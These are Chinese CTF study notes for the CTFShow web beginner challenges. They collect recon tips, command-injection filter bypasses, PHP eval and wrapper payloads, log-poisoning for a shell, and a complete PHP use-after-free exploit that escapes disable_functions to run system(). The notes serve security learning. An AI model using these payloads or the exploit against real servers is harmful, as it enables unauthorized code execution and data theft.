# CTFShow-web入门（1）

<div class="has-toc have-toc">
</div>

## 0x00 信息搜集 {#0x00-信息搜集}

列举常见的信息搜集手法

查看源代码

ctrl+shift+i

查看响应包的headers

查看robots.txt

下载phps源码

下载目录源码，如：www.zip

查看.git或.svn文件

vim编辑时会产生一个filename.swp的文件，例如：index.php.swp

查看cookie

查看域名信息，可通过<a href="https://zijian.aliyun.com/" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://zijian.aliyun.com/</a>等

查看网页公开信息，比如电话号、QQ、邮箱

查看公开技术文档

小0day:KindEditor PHP默认配置下插入文件，如果目录不存在，则会遍历服务器根目录

php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针

数据库备份文件，如：backup.sql和/db/db.mdb

查看加密算法及密钥

## 0x01 爆破 {#0x01-爆破}

Custom iterator爆破，参考<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.cnblogs.com/007NBqaq/p/13220297.html</a>

子域名爆破

根据php算法爆破token

php伪随机数，种子预测随机数和随机数预测种子。<a rel="noreferrer noopener" href="https://blog.csdn.net/zss192/article/details/104327432" target="_blank" rel="nofollow" >https://blog.csdn.net/zss192/article/details/104327432</a>

爆破身份证

爆破文件目录，如/0/1/

## 0x02 命令执行 {#0x02-命令执行}

通配符`?`和`*`

引号拼接，如：`fl''ag.php`，`fl""ag.php`

\拼接，如：`fla\g.php`

可执行并直接显示结果的函数：`system`、`passthru`

需要echo显示结果的函数：反引号`` ` ``、`exec`、`shell_exec`

<a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank"  rel="nofollow" >https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a>

cat被过滤时，常见读文件命令

<pre class="wp-block-code"><code>curl命令读文件

strings:查找可打印的字符串
rev:反转查看内容
more/less:一页一页的显示内容
head:查看头几行   tail:查看尾几行
tac:从最后一行开始显示
nl：显示的时候，顺便输出行号
sort:将文本文件内容加以排序
uniq:检查文本文件中重复出现的行列
vi/vim:编辑器查看
grep:查找文件里符合条件的字符串

awk:处理文本文件
  NF   每一行拥有的字段总数
  NR   目前处理的是第几行的数据
  FS   目前的分隔字符
awk    '条件{命令}'   文件
常用payload:awk 'NR&lt;10{print $1"\t"$2"\t"$3}' flag
把flag文件中的前10行的第1、2、3列的数据列出来 （以&#91;tab]或空格键分隔）

sed:处理文本文件
sed    '命令'   文件
常用payload:sed '1,10d' flag
查看flag文件1~10行的内容

bash -v:打印整个文件后执行
file -f:指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。

od:以二进制的方式读取内容
-A 指定地址进制包括：
    o 八进制（系统默认值）
    d 十进制
    x 十六进制
    n 不打印位移值
-t 指定数据的显示格式，主要参数有：
    c ASCII字符或反斜杠序列(如\n)
    d 有符号十进制数
    f 浮点数
    o 八进制（系统默认值）
    u 无符号十进制数
    x 十六进制数

cut:用于显示每行从开头算起 num1 到 num2 的文字
-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。
-c ：以字符为单位进行分割。</code></pre>

花式读文件：<a href="https://www.cnblogs.com/linuxsec/articles/10741588.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.cnblogs.com/linuxsec/articles/10741588.html</a>

php函数操作：

<pre class="wp-block-code"><code>scandir('.') 扫描当前目录
localeconv() 函数返回一数组。而数组第一项就是.(用来绕过.过滤)
pos()/current() 返回数组第一个值</code></pre>

数组操作函数：

<pre class="wp-block-code"><code>end() 数组指针指向最后一位
next() 数组指针指向下一位
array_reverse() 将数组颠倒
array_rand() 随机返回数组的键名
array_flip() 交换数组的键和值</code></pre>

读取文件函数：`file_get_content()` 、`readfile()`、`highlight_file()`、`show_source()`、`var_dump(file('filename'))`、`print_r(file('filename'))`

一些情况下也可通过`include`、`require`、`include_once`、`require_once`读取文件内容。

过滤分号时可以使用`?>`替代`;`

过滤括号时可以使用`include`和伪协议的配合

<pre class="wp-block-code"><code>因为include包含php文件不会在页面显示出来
所以可以配合伪协议将flag.php打印,而且新的参数不会受过滤影响</code></pre>

常用payload:

<pre class="wp-block-code"><code>c=include$_GET&#91;"a"]?&gt;&a=php://filter/read=convert.base64-encode/resource=flag.php
c=include$_GET&#91;'a']?&gt;&a=data://text/plain,&lt;?php system("cat flag.php");?&gt;
c=include$_GET&#91;a]?&gt;&a=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</code></pre>

日志包含获取Shell，如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，可以通过burpsuit绕过编码写入apache的日志文件，前提是得知道日志文件的存储路径。

日志默认路径

<pre class="wp-block-code"><code>(1) apache+Linux日志默认路径
/etc/httpd/logs/access.log或者/var/log/httpd/access.log
n
(2) apache+win2003日志默认路径
D:\xampp\apache\logs\access.log或者D:\xampp\apache\logs\error.log

(3) IIS6.0+win2003默认日志文件
C:\WINDOWS\system32\Logfiles

(4) IIS7.0+win2003 默认日志文件
%SystemDrive%\inetpub\logs\LogFiles

(5) nginx 日志文件
日志文件在用户安装目录logs目录下，如/usr/local/nginx,日志目录为/usr/local/nginx/logs</code></pre>

通过`.php`后缀限制`include`时，使用`data://text/plain`, 相当于执行了php语句，因为前面的php语句已经闭合了，所以后面的`.php`会被当成html页面直接显示。

无字母数字绕过正则表达式总结脚本：<a href="https://blog.csdn.net/miuzzx/article/details/109143413" target="_blank"  rel="nofollow" >https://blog.csdn.net/miuzzx/article/details/109143413</a>

一些不包含数字和字母的webshell：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank"  rel="nofollow" >https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a>

无字母数字webshell之提高篇：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a>

`session_id()`结合`PHPSESSID`，受php版本影响 5.5 -7.1.9均可以执行，`session_id`规定为0-9，a-z,A-Z,-中的字符。

命令分隔

<pre class="wp-block-code"><code>换行符     %0a
回车符     %0d
连续指令   ;
后台进程   &（编码%26）
管道符     |
(逻辑?)    ||  &&

windows中：%1a（作为.bat文件中的命令分隔符）</code></pre>

空格绕过

<pre class="wp-block-code"><code>>、&lt;、&lt;>   //重定向符,通常结合nl等命令使用
%09(需要php环境,tab)
${IFS}
$IFS
$IFS$9
,    //用逗号实现了空格功能
%20</code></pre>

过滤字母时可用payload:c=`/???/????64 ????.???`读取flag.php，bin目录为binary的简写，主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，这里可以利用 base64 中的64 进行通配符匹配，即/bin/base64 flag.php。

另一种payload:c=`/???/???/????2 ????.???`，可通过/usr/bin目录，常包括例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等，可以利用/usr/bin下的bzip2将flag.php文件进行压缩，然后再下载。

构造数字，`$(( ))`与整数运算

<pre class="wp-block-code"><code>$(())---------是0
$((~$(())))---是-1
$((~$(())))$((~$(())))---是-1-1
$(($((~$(())))$((~$(())))))---是-2

同时$((~-a))=a-1，如：$((~-5))=4
$((~a))=-a-1，如：$((~5))=-6</code></pre>

<p id="block-6c7ae655-d855-4388-ae1b-c8634a7119a8">
  通过fopen去读取文件内容
</p>
<pre class="wp-block-code"><code>fread()
fgets()
fgetc()
fgetss()//This function has been DEPRECATED as of PHP 7.3.0, and REMOVED as of PHP 8.0.0
fgetcsv()
fpassthru()


对应payload:
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fread($a,filesize("flag.php"));echo $line;}

c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取

c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取

c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetss($a);echo $line;} 

//php7.3.0版本后 该函数已不再被使用

c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}

c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fpassthru($a);echo $line;}</code></pre>

常用获取文件路径的函数组合

<pre class="wp-block-code"><code>c=print_r(scandir(current(localeconv())));

c=print_r(scandir(dirname('__FILE__')));

c=$a=new DirectoryIterator('glob:///var/www/html/*');foreach($a as $f){echo($f->__toString()." ");}

c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "&lt;br>"; };</code></pre>

通过`copy()`和`rename()`，复制文件内容后，访问url/flag.txt，如：`copy("flag.php","flag.txt");rename("flag.php","flag.txt");` 

<pre class="wp-block-code"><code>&lt;?php

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST&#91;'c'])){
        $c= $_POST&#91;'c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/&#91;0-9]|&#91;a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>

ob_get_contents — 返回输出缓冲区的内容
ob_end_clean — 会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</code></pre>

通过`exit();`使程序提前退出，绕过后面的正则表达式。

如果open_basedir 限制了访问路径，可以先找到文件。

<pre class="wp-block-code"><code>c=?>&lt;?php $a=new DirectoryIterator("glob://./*");
foreach($a as $f)
{echo($f->__toString().' ');
}
exit(0);
?></code></pre>
然后使用群主提供的uaf脚本

```
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }
    
    class Helper {
        public $a, $b, $c, $d;
    }
    
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }
    
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }
    
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
    
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
    
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
    
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
    
            if($p_type == 1 && $p_flags == 6) { 
    
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }
    
        if(!$data_addr || !$text_size || !$data_size)
            return false;
    
        return [$data_addr, $text_size, $data_size];
    }
    
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
    
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
    
            return $data_addr + $i * 8;
        }
    }
    
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }
    
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
    
            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    
    function trigger_uaf($arg) {
    
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
    
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
    
    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
    
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
    
    $helper = new Helper;
    $helper->b = function ($x) { };
    
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
    
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
    
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
    
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
    
    $closure_obj = str2ptr($abc, 0x20);
    
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
    
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
    
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
    
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
    
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 
    
    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
#需要通过url编码哦
```

利用mysql load_file读文件

<pre class="wp-block-code"><code>c=try {
    $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');

    foreach ($dbh->query('select load_file("/flag36.txt")') as $row) {
        echo ($row&#91;0]) . "|";
    }
    $dbh = null;
} catch (PDOException $e) {
    echo $e->getMessage();
    exit(0);
}
exit(0);</code></pre>

PHP7.4-FFI

<blockquote class="wp-block-quote">
  <p>
    (PHP 7 >= 7.4.0, PHP 8)<br />FFI::cdef — Creates a new FFI object<br />FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。
  </p>
</blockquote>

<pre class="wp-block-code"><code>c=$ffi = FFI::cdef("int system(const char *command);");
$a='/flagfile > 1.txt';
$ffi->system($a);</code></pre>

使用bash的内置变量进行绕过，不完全总结

<pre class="wp-block-code"><code>${PATH}          /root/bin
${PATH:~0}          n
${PATH:~1}          in
${PATH:~2}          bin
${PATH:~A}          n
${PATH:~a}          n
${PATH:5:4}         /bin

${PWD}          /var/www/html
${PWD:~A}          l
${PWD::${#SHLVL}}  /

SHLVL代表shell打开的深度,进程第一次打开shell时${SHLVL}=1
BASH_SUBSHELL代表一个 Bash 进程实例中多个子 Shell嵌套深度，${BASH_SUBSHELL}=0
HISTFILE设定历史脚本文件的路径文件名，通常是/root/.bash_history
RANDOM取随机数
$?上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。

${#x}为x变量结果的长度，如${#HISTFILE}=19

</code></pre>

```
常用:
FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|PHP_VERSION|RANDOM|PWD|HOME
```

参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/sparkdev/p/9934595.html" target="_blank" rel="nofollow" >https://www.cnblogs.com/sparkdev/p/9934595.html</a>、<a href="https://www.cnblogs.com/zengkefu/p/5558161.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.cnblogs.com/zengkefu/p/5558161.html</a>

利用`<A`的报错，No such file or directory，能返回值1。

```
"OS error code   1:  Operation not permitted"
"OS error code   2:  No such file or directory"
"OS error code   3:  No such process"
"OS error code   4:  Interrupted system call"
"OS error code   5:  Input/output error"
"OS error code   6:  No such device or address"
"OS error code   7:  Argument list too long"
"OS error code   8:  Exec format error"
"OS error code   9:  Bad file descriptor"
"OS error code  10:  No child processes"

if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

常用数学函数<a rel="noreferrer noopener" href="https://www.w3school.com.cn/php/php_ref_math.asp" target="_blank" rel="nofollow" >https://www.w3school.com.cn/php/php_ref_math.asp</a>

```
base_convert(number,frombase,tobase);
参数	描述
number	    必需。规定要转换的数。
frombase	必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
tobase	    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。

bindec — 二进制转换为十进制
bindec ( string $binary_string ) : number

decbin — 十进制转换为二进制
decbin ( int $number ) : string

dechex — 十进制转换为十六进制
dechex ( int $number ) : string

decoct — 十进制转换为八进制
decoct ( int $number ) : string

hexdec — 十六进制转换为十进制
hexdec ( int $number ) : string
```

`[]`可用`{}`代替。

构造过程

```
c=$_GET[a]($_GET[b])&a=system&b=cat flag

echo base_convert('hex2bin', 36, 10);
结果  37907361743
base_convert(37907361743,10,36);------>hex2bin

echo hexdec(bin2hex("_GET"));
结果 1598506324
base_convert(37907361743,10,36)(dechex(1598506324));------>_GET

用白名单中的函数名充当变量名
构造$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{cos});&abs=system&cos=cat flag.php
```

另一种方法，配合`getallheaders`函数，通过php头构造命令。

<pre class="wp-block-code"><code>echo base_convert('getallheaders',30,10);
//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功

c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1}) 
PHPHeader  1-----tac flag.php</code></pre>
